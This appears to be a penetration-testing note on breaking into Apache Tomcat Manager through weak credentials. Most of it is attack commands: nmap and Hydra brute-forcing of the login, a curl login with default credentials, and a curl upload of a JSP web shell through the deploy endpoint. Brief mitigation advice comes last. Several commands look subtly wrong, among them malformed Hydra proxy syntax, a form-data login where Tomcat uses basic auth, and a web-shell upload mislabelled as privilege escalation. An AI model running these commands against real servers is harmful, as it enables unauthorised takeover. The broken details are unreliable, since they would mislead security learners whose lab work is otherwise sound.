# 🛰️ Tomcat Manager Weak Credentials

> [!ABSTRACT] Overview of Vulnerability
>
> This note covers the exploitation of weak credentials in Apache Tomcat's manager application, detailing steps from initial enumeration to privilege escalation.

---

## 🔍 Initial Enumeration

### Nmap Scan

```bash
nmap -sV <IP> --script=http-tomcat-manager-brute
```

This command checks for the presence of the Tomcat Manager application and attempts a brute-force attack on its default credentials.

---

## 📝 Exploiting Weak Credentials

### Using Hydra

#### Step 1: Setting Up Hydra

```bash
hydra -L users.txt -P passwords.txt http://<IP>/manager/html PROXY <proxy_ip>:8080
```

This command uses `Hydra` to brute-force login credentials for the Tomcat Manager application.

---

### Using Burp Suite Intruder

#### Step 2: Configuring Burp Suite

1. Configure Burp Proxy to intercept traffic.
2. Set up a repeater session with a POST request to `/manager/html`.
3. Inject username and password pairs from a file using Intruder module.

This method involves manually inputting credentials or importing them into the Intruder tab in Burp Suite for automated testing.

---

## 📂 Tomcat Manager Interface

### Accessing the Manager App

```bash
curl -X POST http://<IP>/manager/html --data "username=admin&password=123456" -k
```

This command tries to access the Tomcat Manager application with a default username and password.

---

## 🔑 Privilege Escalation

### Uploading Web Shell via Deployer Role

#### Step 3: Using Weak Credentials for Upload

```bash
curl -u admin:weakpassword -T shell.jsp http://<IP>:8080/manager/html/deploy?path=/shell&update=true
```

This command uploads a web shell file to the Tomcat server using weak credentials, granting access to deploy applications.

---

## ⚠️ Security Recommendations

> [!WARNING] 
>
> Ensure strong authentication mechanisms are in place for all administrative interfaces such as Tomcat Manager. Regularly update and patch systems to prevent exploitation of default or weak credentials.

---

## 📝 Summary

This document outlines the process of identifying, exploiting, and mitigating vulnerabilities associated with weak credentials in Apache Tomcat's manager interface. Proper security measures should be implemented to secure these components against unauthorized access and privilege escalation attacks.

> [!NOTE]
> Always verify if services are running in a testing environment before attempting any real-world exploitation.
---
> [!TODO] 
>
> - Review and update firewall rules for Tomcat Manager access.
> - Implement two-factor authentication for administrative interfaces.